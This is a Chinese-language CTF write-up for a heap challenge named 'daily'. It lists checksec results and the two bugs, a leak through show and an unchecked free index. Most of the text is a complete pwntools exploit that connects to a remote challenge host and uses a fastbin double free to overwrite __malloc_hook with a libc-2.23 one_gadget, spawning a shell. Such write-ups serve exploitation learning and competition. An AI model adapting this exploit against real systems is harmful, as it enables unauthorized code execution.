# daily
这种题之前没见过
一开始思路错了...还以为是`house of spirite`...
幸亏一边写exp一遍想...发现`double free`更快...
也比较简单幸亏手速够快拿了个2血
## analysis
checksec
```python
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
* 没开`pie`感觉自己有被迫害恐惧症...每次没开`pie`都没注意都以为题目开了`pie`做到一半才想起来
* 存在show,没有末尾加截断可以泄露libc,heap
* free idx没有检查可以free任意地址上的指针.

## 思路
* 泄露libc,heap
* heap上留指向某chunk的指针
* double free
## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(size,c='A'):
	cmd(2)
	p.sendlineafter("ily:",str(size))
	p.sendafter("daily\n",str(c))
def show():
	cmd(1)
def free(idx):
	cmd(4)
	p.sendlineafter("ily:",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("ily:",str(idx))
	p.sendafter("daily\n",str(c))
context.log_level='debug'
#p=process('./p2')
p=remote("39.106.224.151",58512)
add(0x88,"A")#0
add(0x18,"B")#1
free(0)
add(0x88,"A")#0
show()
p.readuntil("0 : ")
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd1b41-0x00007ffff7a0d000)

add(0x18,"A")#2
free(1)
free(2)
add(0x18,"A")#1
show()
p.readuntil("1 : ")
heap=u64(p.readuntil("=")[:-1].ljust(8,'\x00'))-0x41

add(0x18,p64(0x68)+p64(heap+0xd0+0x10))#2
add(0x68,"A")#3
add(0x68,'A')#4
free(3)
free(4)
idx=(heap+0xa0-0x0602060)//16
free(idx)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc.address=base
add(0x68,p64(libc.symbols['__malloc_hook']-35))#3
add(0x68)#4
add(0x68)#5
one=0xf02a4
add(0x68,'\x00'*19+p64(one+base))
free(3)
free(5)
log.warning(hex(base))
log.warning(hex(heap))
#gdb.attach(p,'b *0x000000000400C16')

p.interactive()
```